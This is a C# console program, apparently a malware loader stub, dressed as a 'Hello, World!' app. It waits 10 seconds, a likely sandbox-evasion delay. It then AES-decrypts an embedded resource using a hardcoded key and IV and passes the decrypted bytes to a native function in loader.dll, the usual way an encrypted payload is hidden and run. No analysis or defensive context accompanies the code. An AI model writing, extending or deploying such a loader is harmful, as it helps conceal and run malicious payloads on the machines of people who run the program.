// ConsoleApp/Program.cs
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ConsoleApp
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Waiting 10 seconds before starting...");
            System.Threading.Thread.Sleep(10000);

            Console.WriteLine("Hello, World!");

            Aes jar = Aes.Create();
            jar.Key = Encoding.ASCII.GetBytes("kyungjle01234567");
            jar.IV = Encoding.ASCII.GetBytes("01234567kyungjle");
            byte[] data = jar.DecryptCbc(
                Resource1.a,
                jar.IV
            );

            VnoV(data, data.Length);
            Console.WriteLine("Data processed successfully.");
        }

        [DllImport("loader.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern void VnoV(byte[] a, int b);
    }
}
